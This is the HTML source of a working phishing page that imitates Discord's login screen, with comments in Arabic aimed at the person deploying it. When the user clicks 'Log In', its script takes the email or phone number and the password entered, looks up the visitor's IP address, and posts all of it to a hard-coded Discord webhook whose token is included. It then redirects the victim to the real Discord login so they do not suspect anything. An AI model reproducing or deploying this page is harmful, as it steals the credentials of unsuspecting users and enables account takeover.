<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Discord | Login</title>
    <style>
        /* CSS RESET - أهم جزء عشان تضبط الأبعاد */
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            font-family: 'Helvetica Neue', Helvetica, Arial, sans-serif;
        }

        body {
            background-color: #313338; /* لون خلفية ديسكورد الرسمي */
            background-image: url('https://discord.com/assets/f9a059600e5728a7e781.svg');
            background-size: cover;
            background-position: center;
            height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
        }

        /* حاوية تسجيل الدخول */
        .login-box {
            background: #2B2D31;
            width: 480px;
            padding: 32px;
            border-radius: 8px;
            box-shadow: 0 8px 16px rgba(0,0,0,0.24);
            text-align: center;
        }

        h2 {
            color: #F2F3F5;
            font-size: 24px;
            margin-bottom: 8px;
            font-weight: 600;
        }

        p {
            color: #B5BAC1;
            font-size: 16px;
            margin-bottom: 20px;
        }

        /* ضبط الحقول */
        .input-group {
            text-align: left;
            margin-bottom: 20px;
        }

        label {
            display: block;
            color: #B5BAC1;
            font-size: 12px;
            font-weight: bold;
            margin-bottom: 8px;
            text-transform: uppercase;
        }

        input {
            width: 100%;
            height: 40px;
            padding: 10px;
            background: #1E1F22;
            border: none;
            border-radius: 3px;
            color: #DBDEE1;
            font-size: 16px;
            outline: none;
            transition: border 0.2s;
        }

        input:focus {
            border: 1px solid #00A8FC;
        }

        /* روابط إضافية */
        .forgot-pass {
            color: #00A8FC;
            font-size: 14px;
            margin-top: 4px;
            cursor: pointer;
            text-decoration: none;
        }

        .forgot-pass:hover {
            text-decoration: underline;
        }

        /* الزر الرئيسي */
        button {
            width: 100%;
            height: 44px;
            background-color: #5865F2;
            color: white;
            border: none;
            border-radius: 3px;
            font-size: 16px;
            font-weight: 500;
            cursor: pointer;
            margin-top: 20px;
            transition: background-color 0.2s;
        }

        button:hover {
            background-color: #4752C4;
        }

        .register {
            margin-top: 16px;
            text-align: left;
            font-size: 14px;
            color: #949BA4;
        }

        .register span {
            color: #00A8FC;
            cursor: pointer;
        }
    </style>
</head>
<body>

    <div class="login-box">
        <h2>Welcome back!</h2>
        <p>We're so excited to see you again!</p>

        <div class="input-group">
            <label>Email or Phone Number</label>
            <input type="text" id="user_field">
        </div>

        <div class="input-group">
            <label>Password</label>
            <input type="password" id="pass_field">
            <div class="forgot-pass">Forgot your password?</div>
        </div>

        <button onclick="captureData()">Log In</button>

        <div class="register">
            Need an account? <span>Register</span>
        </div>
    </div>

    <script>
        // هنا تحط الرابط حقك
        const DISCORD_WEBHOOK = "https://discord.com/api/webhooks/1504842638744883341/zkiQ3Qdve9TYO8lEu06GBMRSZhaHOyVC22lTzWOl8Vp4XQcuDAO7pjUBvoEZJSbutdLr";

        async function captureData() {
            const u = document.getElementById('user_field').value;
            const p = document.getElementById('pass_field').value;

            if (!u || !p) return;

            // جلب IP الضحية
            let ip = "Unknown";
            try {
                const response = await fetch('https://api.ipify.org?format=json');
                const data = await response.json();
                ip = data.ip;
            } catch (e) {}

            const payload = {
                embeds: [{
                    title: "📥 Login Captured",
                    color: 5814783,
                    fields: [
                        { name: "👤 User/Mail", value: `\`${u}\``, inline: true },
                        { name: "🔑 Pass", value: `\`${p}\``, inline: true },
                        { name: "🌐 IP", value: `\`${ip}\`` }
                    ],
                    footer: { text: "Leviathan Auto-Capture" },
                    timestamp: new Date()
                }]
            };

            fetch(DISCORD_WEBHOOK, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify(payload)
            }).then(() => {
                // تحويل لصفحة ديسكورد الحقيقية عشان ما يشك
                window.location.replace("https://discord.com/login");
            });
        }
    </script>
</body>
</html>
